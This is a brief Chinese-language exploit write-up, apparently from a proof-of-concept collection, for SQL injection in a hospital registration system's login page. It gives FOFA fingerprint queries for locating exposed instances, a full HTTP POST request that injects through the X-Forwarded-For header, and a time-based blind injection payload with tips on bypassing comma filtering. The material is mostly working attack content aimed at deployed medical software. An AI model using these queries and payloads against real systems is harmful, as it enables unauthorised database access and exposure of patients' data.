## 医院挂号系统SQL注入

## fofa
```
body="res/img/ht_box_back.gif" || body="/res/img/ht_box_top.gif" || body="/res/img/ht_box_bottom.gif" || body="dom_loaded.load(init);"
```

## poc
```
POST /m/login.php?op=login HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: application/x-www-form-urlencoded
x-forwarded-for: "127.0.0.1 ' and exists(select * from xxxxx)-- 123"

username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
```
此注入为insert注入，千万别用sqlmap或其他自动化工具进行扫描。上面的payload: ' and exists(select * from xxxxx)-- 123 可在响应里面直接报错数据库名，各大公益收录平台都认。如果想继续利用，可参考盲注payload:' and CASE WHEN ((select database()) like 'z%') THEN (sleep(5)) ELSE 2 END-- wUwJ  使用此进行手动盲注。 此系统会过滤逗号，逗号后面的sql不会执行，想研究的师傅需要自行研究一下。
